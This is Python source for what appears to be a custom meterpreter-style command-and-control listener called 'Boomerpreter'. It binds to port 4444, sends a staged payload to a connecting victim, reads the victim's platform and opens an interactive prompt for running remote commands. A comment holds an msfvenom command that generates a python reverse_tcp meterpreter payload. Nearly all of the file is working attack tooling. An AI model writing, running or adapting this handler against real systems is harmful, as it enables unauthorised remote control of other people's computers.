import os
import json
import struct
import socket

# TO TEST: msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > launch.py

class Boomerpreter:
    def __init__(self, ip, port, boomerpreter_code):
        self.ip = ip
        self.port = port
        self.boomerpreter_code = boomerpreter_code
        self.current_session = None
        self.functions = {
            "execute": "execute"
        }

    def send_msg(self, msg):
        data = {
            "function": msg[0],
            "args": []
        }
        if len(msg) > 1:
            data["args"] = msg[1:]
                
        self.current_session.send((json.dumps(data)).encode())
        
    def recv_msg(self):
        data =  self.current_session.recv(4096)
        if len(data) == 0:
            raise Exception("Broken pipe")
        return json.loads(data.decode())

    def interact(self, session_id):
        while True:
            try:
                data_input = input("BoomERpreter >> ")
                data_input = data_input.strip()
                if data_input == "":
                    continue
                if "exit" in data_input:
                    return
                split_data = data_input.split()
                opt = self.functions[split_data[0]]
                if not opt:
                    print("Wrong operation")
                    continue
                getattr(self, opt)(split_data)
            except Exception as e:
                if "Broken pipe" in str(e):
                    print("Meterpreter closed")
                    return

    def start_boomernix(self):
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind the socket to the port
        server_address = (self.ip, int(self.port))
        print('starting up on %s port %s' % server_address)
        sock.bind(server_address)
        # Listen for incoming connections
        sock.listen(1)
        try:
            print('waiting for a connection')
            self.current_session, client_address = sock.accept()
            try:
                print('Sending BoomErpreter --> %s:%s' % (client_address[0], str(client_address[1])))
                file_boomer = (self.boomerpreter_code)
                meterpreter = open(file_boomer, "r").read()
                meterpreter = meterpreter.encode()
                #Code length
                length = struct.pack('>I', len(meterpreter))
                self.current_session.send(length)
                #Meterpreter
                c = self.current_session.send(meterpreter)
                if c == 0:
                    return
                print("%s bytes have been sent" % str(c))
                platform = self.current_session.recv(1024)
                print("Session has been created")
                print("Running on %s"%platform.decode())
                self.interact(self.current_session)
            except Exception as e:
                print(str(e))
        except:
            pass
        finally:
            sock.close()
    
    def execute(self, data):
        self.send_msg(data)
        data = self.recv_msg()
        print(data.strip())


ip = "192.168.206.131"
port = "4444"
meterpreter = "boomerpreter.py"

boomerpreter = Boomerpreter(ip, port, meterpreter)
boomerpreter.start_boomernix()
